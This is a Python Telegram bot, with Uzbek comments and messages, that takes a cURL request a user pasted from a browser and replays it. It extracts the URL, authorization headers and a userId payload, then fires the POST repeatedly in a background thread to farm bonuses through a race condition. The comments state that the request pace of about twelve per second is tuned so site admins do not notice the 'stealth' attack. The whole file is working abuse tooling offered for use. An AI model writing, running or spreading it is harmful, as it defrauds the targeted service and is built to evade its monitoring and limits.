import telebot
from telebot import types
import requests
import threading
import time
import os
import re
import json

# Tokenni Render'dan oladi
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

# Foydalanuvchilar ma'lumotlarini saqlash uchun baza (Memory)
users_data = {}

# Asosiy menyu tugmalari
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Hujumni boshlash")
    btn2 = types.KeyboardButton("🛑 To'xtatish")
    btn3 = types.KeyboardButton("⚙️ Sozlamalarni ko'rish")
    markup.add(btn1, btn2, btn3)
    return markup

# cURL matnini tahlil qiluvchi aqlli funksiya
def parse_curl(curl_text):
    try:
        # URL ni ajratish
        url_match = re.search(r"curl\s+'([^']+)'", curl_text)
        url = url_match.group(1) if url_match else None

        # Headerlarni (tokenlarni) ajratish
        headers = {}
        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", curl_text)
        for k, v in header_matches:
            headers[k.strip()] = v.strip()

        # Data (userId) ni ajratish
        data = None
        data_match = re.search(r"--data-raw\s+'([^']+)'", curl_text)
        if data_match:
            data = json.loads(data_match.group(1))

        if url and headers:
            return {"url": url, "headers": headers, "data": data, "is_running": False}
    except Exception as e:
        return None
    return None

# Hujum funksiyasi (Stealth rejim)
def attack(chat_id):
    user = users_data.get(chat_id)
    if not user:
        return
    
    count = 0
    # Xavfsiz poyga (Race condition): tezlikni optimal saqlaymiz
    while user["is_running"]:
        try:
            response = requests.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
            count += 1
            if response.status_code == 200:
                print(f"{chat_id} - Muvaffaqiyatli! ({count})")
            elif response.status_code == 423:
                # Limit tugadi
                bot.send_message(chat_id, "⚠️ Limit tugadi (yoki sayt blokladi). Hujum to'xtatildi.")
                user["is_running"] = False
                break
        except Exception as e:
            time.sleep(1) # Aloqa uzilsa biroz kutib yana uradi
            continue
        
        # Yashirin tezlik (0.08 soniya - soniyasiga ~12 ta so'rov, adminga sezilmaydi)
        time.sleep(0.08)

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id, 
        "👋 Assalomu alaykum! Men **Bonus ovchisi** botiman.\n\n"
        "Menga brauzerdan olingan to'liq `cURL` kodingizni tashlang, qolganini o'zim hal qilaman!",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text.startswith("curl "))
def handle_curl(message):
    chat_id = message.chat.id
    parsed = parse_curl(message.text)
    
    if parsed:
        users_data[chat_id] = parsed
        bot.reply_to(message, "✅ cURL qabul qilindi va tahlil qilindi! Endi hujumni boshlashingiz mumkin.", reply_markup=get_main_menu())
    else:
        bot.reply_to(message, "❌ Xatolik! cURL formati noto'g'ri. Iltimos, kodni to'liq nusxalab yuboring.")

@bot.message_handler(func=lambda message: message.text in ["🚀 Hujumni boshlash", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
def handle_menu(message):
    chat_id = message.chat.id
    user = users_data.get(chat_id)

    if message.text == "🚀 Hujumni boshlash":
        if not user:
            bot.send_message(chat_id, "Oldin `cURL` kodni yuboring!")
            return
        if not user["is_running"]:
            user["is_running"] = True
            threading.Thread(target=attack, args=(chat_id,)).start()
            bot.send_message(chat_id, "🚀 Hujum yashirin rejimda boshlandi! (Server e'tiborini tortmaslik uchun optimallashtirildi)")
        else:
            bot.send_message(chat_id, "Hujum allaqachon ketyapti! 🔥")

    elif message.text == "🛑 To'xtatish":
        if user and user["is_running"]:
            user["is_running"] = False
            bot.send_message(chat_id, "🛑 Hujum to'xtatildi. ✅")
        else:
            bot.send_message(chat_id, "Hozir hech qanday hujum ketmayapti.")

    elif message.text == "⚙️ Sozlamalarni ko'rish":
        if user:
            url_short = user["url"].split("/")[-1]
            bot.send_message(chat_id, f"📊 **Joriy sozlamalar:**\n\nManzil: `.../{url_short}`\nID: `{user['data'].get('userId', 'Noma\'lum')}`\nHolat: {'Ishlamoqda 🟢' if user['is_running'] else 'To\'xtatilgan 🔴'}", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "Siz hali `cURL` kod kiritmagansiz.")

# Bot o'chib qolmasligi uchun himoya
while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception:
        time.sleep(5)
